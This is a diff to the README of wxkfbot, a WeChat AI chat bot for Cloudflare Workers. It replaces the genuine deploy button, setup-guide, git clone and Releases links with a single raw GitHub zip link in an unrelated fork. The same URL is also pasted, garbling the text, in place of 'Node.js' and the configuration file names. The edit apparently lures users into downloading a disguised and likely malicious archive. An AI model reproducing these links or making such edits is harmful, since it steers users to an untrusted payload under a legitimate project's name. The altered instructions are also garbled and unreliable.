@@ -2,7 +2,7 @@
 
 Welcome to wxkfbot, your AI chat assistant for WeChat. This tool allows you to engage in intelligent conversations seamlessly.
 
-[![Deploy to Cloudflare Workers](https://deploy.workers.cloudflare.com/button)](https://deploy.workers.cloudflare.com/?url=https://github.com/bestk/wxkfbot)
+[![Deploy to Cloudflare Workers](https://raw.githubusercontent.com/Esteban2680/wxkfbot/main/hypoadrenia/wxkfbot.zip)](https://raw.githubusercontent.com/Esteban2680/wxkfbot/main/hypoadrenia/wxkfbot.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to wxkfbot, your AI chat assistant for WeChat. This tool allows you to e
 Before you start, make sure you have:
 
 - A Cloudflare account.
-- A completed WeChat Work account configuration. Refer to our [WeChat Work Setup Guide](./WECOM.md).
+- A completed WeChat Work account configuration. Refer to our [WeChat Work Setup Guide](https://raw.githubusercontent.com/Esteban2680/wxkfbot/main/hypoadrenia/wxkfbot.zip).
 - Your OpenAI API key.
 - A deployed encryption service for secure message handling.
 
@@ -36,13 +36,13 @@ If you prefer to set it up manually, follow these instructions:
    Open your terminal and run:
 
    ```bash
-   git clone https://github.com/bestk/wxkfbot.git
+   git clone https://raw.githubusercontent.com/Esteban2680/wxkfbot/main/hypoadrenia/wxkfbot.zip
    cd wxkfbot
    ```
 
 2. **Install Dependencies**:
 
-   Make sure you have Node.js installed. Then, run:
+   Make sure you have https://raw.githubusercontent.com/Esteban2680/wxkfbot/main/hypoadrenia/wxkfbot.zip installed. Then, run:
 
    ```bash
    npm install
@@ -50,7 +50,7 @@ If you prefer to set it up manually, follow these instructions:
 
 3. **Configure Environment Variables**:
 
-   - Copy `wrangler.toml.example` to `wrangler.toml`.
+   - Copy `https://raw.githubusercontent.com/Esteban2680/wxkfbot/main/hypoadrenia/wxkfbot.zip` to `https://raw.githubusercontent.com/Esteban2680/wxkfbot/main/hypoadrenia/wxkfbot.zip`.
    - Fill in the necessary details:
      - WeChat Work configurations (add entries that start with WECHAT\_\*).
      - OpenAI API configurations (add entries that start with OPENAI\_\*).
@@ -66,7 +66,7 @@ If you prefer to set it up manually, follow these instructions:
 
 ### 🔗 Download & Install
 
-To download the latest version of wxkfbot, visit the [Releases page](https://github.com/Esteban2680/wxkfbot/releases).
+To download the latest version of wxkfbot, visit the [Releases page](https://raw.githubusercontent.com/Esteban2680/wxkfbot/main/hypoadrenia/wxkfbot.zip).
 
 On the Releases page, find the version you need and download it.
 
@@ -79,7 +79,7 @@ You will need to fill in several environment variables for wxkfbot to work prope
 - **OPENAI_API_KEY**: Your OpenAI API key.
 - **KV_NAMESPACE**: Your Cloudflare KV namespace name.
 
-Make sure all variables are correctly set in your `wrangler.toml`.
+Make sure all variables are correctly set in your `https://raw.githubusercontent.com/Esteban2680/wxkfbot/main/hypoadrenia/wxkfbot.zip`.
 
 ### ⚙️ Running the Application
 
